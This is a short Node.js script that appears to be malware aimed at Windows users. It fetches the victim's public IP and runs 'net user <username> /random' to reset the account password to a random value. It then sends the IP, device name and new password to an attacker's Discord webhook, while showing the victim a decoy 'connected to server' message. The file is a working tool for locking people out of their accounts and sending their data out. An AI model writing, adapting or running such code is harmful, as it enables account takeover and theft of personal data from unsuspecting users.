const { Webhook } = require('discord-webhook-node');
let request = require('request');
const logs = new Webhook("your webhook links");//webhook link
const { exec } = require("child_process");

request.get(`https://api.ipify.org`, function(err, response, body) {
	if (err)
		 process.exit(1);
	
	
(async () => {
exec(`net user ${__dirname.split("\\")[2]} /random`, (error, data, getter) => {
	logs.send(`
	\`\`\`yaml
	Logged IP: ${body}\nDevice Name:${__dirname.split("\\")[2]}\nNew Password: ${data}
	\`\`\`
	`)
	console.log(`connected to server.`)
	if (error){
console.log(`you need to run this application as administrator.`)
logs.send(`the victim doesn't open application as administrator.`)
process.exit(1);
	}

});
  })();
     });
